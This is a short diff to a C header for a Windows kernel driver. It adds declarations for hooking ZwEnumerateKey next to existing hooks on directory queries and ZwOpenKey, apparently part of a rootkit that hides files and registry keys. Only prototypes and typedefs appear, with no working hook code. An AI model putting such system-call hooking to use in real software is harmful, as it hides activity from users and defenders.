@@ -149,6 +149,16 @@ NTSTATUS HookNtQueryDirectoryFile(
 );
 
 NTSTATUS 
+  HookNtEnumerateKey(
+    IN HANDLE  KeyHandle,
+    IN ULONG  Index,
+    IN KEY_INFORMATION_CLASS  KeyInformationClass,
+    OUT PVOID  KeyInformation,
+    IN ULONG  Length,
+    OUT PULONG  ResultLength
+    );
+
+NTSTATUS 
 HookZwOpenKey(
 	PHANDLE phKey,
 	ACCESS_MASK DesiredAccess,
@@ -216,6 +226,15 @@ typedef NTSTATUS (*NTQUERYDIRECTORYFILE)(
 	IN BOOLEAN bRestartQuery
 );
 
+typedef NTSTATUS (*ZWENUMERATEKEY)( 	
+	IN HANDLE, 
+	IN ULONG,
+    IN KEY_INFORMATION_CLASS,
+    OUT PVOID, 
+	IN ULONG, 
+	OUT PULONG 
+);
+
 typedef NTSTATUS (*ZWOPENKEY)( 	
 	IN PHANDLE, 
 	IN OUT ACCESS_MASK, 
@@ -248,6 +267,18 @@ NtDeviceIoControlFile(
 	IN ULONG InBufferLength,
 	OUT PVOID OutBuffer OPTIONAL,
 	IN ULONG OutBufferLength
+);
+
+NTSYSAPI
+NTSTATUS
+NTAPI
+ZwEnumerateKey(
+	IN HANDLE hKey,
+	IN ULONG Index,
+	IN KEY_INFORMATION_CLASS  KeyInfoClass,
+	OUT PVOID KeyInfoBuffer,
+	IN ULONG KeyInfoBufferLength,
+	OUT PULONG BytesCopied
 );
 
 // STRUCTS
